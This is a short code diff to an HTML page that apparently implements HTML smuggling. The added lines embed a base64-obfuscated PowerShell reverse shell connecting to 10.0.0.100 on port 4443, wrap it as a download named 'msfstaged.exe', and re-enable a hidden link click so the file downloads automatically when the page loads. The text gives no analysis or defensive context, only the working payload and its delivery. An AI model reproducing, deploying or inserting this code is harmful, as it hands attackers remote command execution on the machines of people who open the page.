@@ -299,7 +299,7 @@ function base64ToArrayBuffer(base64) {
     return bytes.buffer;
 }
 
-var file ='TVqQAAMAAAAEAAAA'
+var file ='cG93ZXJzaGVsbCAtYyAiJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgxMC4wLjAuMTAwLDQ0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArIFBTUmV2ZXJzZVNoZWxsIyA7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfSRjbGllbnQuQ2xvc2UoKTsiCg=='
 var data = base64ToArrayBuffer(file);
 var blob = new Blob([data], {type: 'octet/stream'});
 var fileName = 'msfstaged.exe';
@@ -309,8 +309,8 @@ document.body.appendChild(a);
 a.style = 'display: none';
 var url = window.URL.createObjectURL(blob);
 a.href = url;
-<!-- a.download = fileName;
-a.click(); -->
+a.download = fileName;
+a.click();
 window.URL.revokeObjectURL(url);
 </script>
 
